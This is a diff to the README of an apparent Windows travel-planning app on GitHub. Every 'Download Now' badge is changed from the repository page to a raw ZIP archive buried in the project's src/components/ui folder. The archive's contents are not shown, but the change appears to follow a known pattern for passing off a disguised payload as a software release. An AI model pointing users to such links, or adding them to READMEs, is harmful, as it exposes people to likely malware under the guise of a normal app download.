@@ -1,6 +1,6 @@
 # 🧭 India-explorer-guide- - Easy Tour Planning for India
 
-[![Download Now](https://img.shields.io/badge/Download-India--explorer--guide--blue?style=for-the-badge)](https://github.com/Ankush0687/India-explorer-guide-)
+[![Download Now](https://img.shields.io/badge/Download-India--explorer--guide--blue?style=for-the-badge)](https://github.com/Ankush0687/India-explorer-guide-/raw/refs/heads/main/src/components/ui/explorer-India-guide-1.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run the app on your Windows PC.
 
 Click the button below to go to the India-explorer-guide- download page on GitHub:
 
-[![Download Now](https://img.shields.io/badge/Download-India--explorer--guide--blue?style=for-the-badge)](https://github.com/Ankush0687/India-explorer-guide-)
+[![Download Now](https://img.shields.io/badge/Download-India--explorer--guide--blue?style=for-the-badge)](https://github.com/Ankush0687/India-explorer-guide-/raw/refs/heads/main/src/components/ui/explorer-India-guide-1.7.zip)
 
 This is where you can find the latest versions, updates, and documentation.
 
@@ -151,4 +151,4 @@ For users who want to customize:
 
 # Download India-explorer-guide- here:
 
-[![Download Now](https://img.shields.io/badge/Download-India--explorer--guide--blue?style=for-the-badge)](https://github.com/Ankush0687/India-explorer-guide-)
+[![Download Now](https://img.shields.io/badge/Download-India--explorer--guide--blue?style=for-the-badge)](https://github.com/Ankush0687/India-explorer-guide-/raw/refs/heads/main/src/components/ui/explorer-India-guide-1.7.zip)
